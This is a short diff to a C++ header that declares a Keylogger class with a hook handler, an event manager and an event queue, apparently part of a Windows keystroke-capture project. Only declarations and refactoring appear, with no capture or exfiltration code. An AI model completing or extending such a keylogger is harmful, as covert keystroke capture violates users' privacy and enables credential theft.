@@ -6,6 +6,9 @@
 #ifndef _KEYLOGGER_H
 #define _KEYLOGGER_H
 
+#include <Windows.h>
+#include <iostream>
+
 #include "AEvent.h"
 #include "EventManager.h"
 #include "HookHandler.h"
@@ -15,14 +18,15 @@ public:
     Keylogger();
 	~Keylogger();
     bool				init();   
-    void				run();
+    bool				run();
     bool				stop();
     bool				kill();
-    bool pushToQueue(AEvent*);
+	bool				pushToQueue(const AEvent*);
 
 private: 
-    EventManager _eventManager;
-    HookHandler _hookHandler;
+	bool				_running;
+    EventManager		_eventManager;
+    HookHandler			_hookHandler;
     std::vector<AEvent*> _events;
 };
 
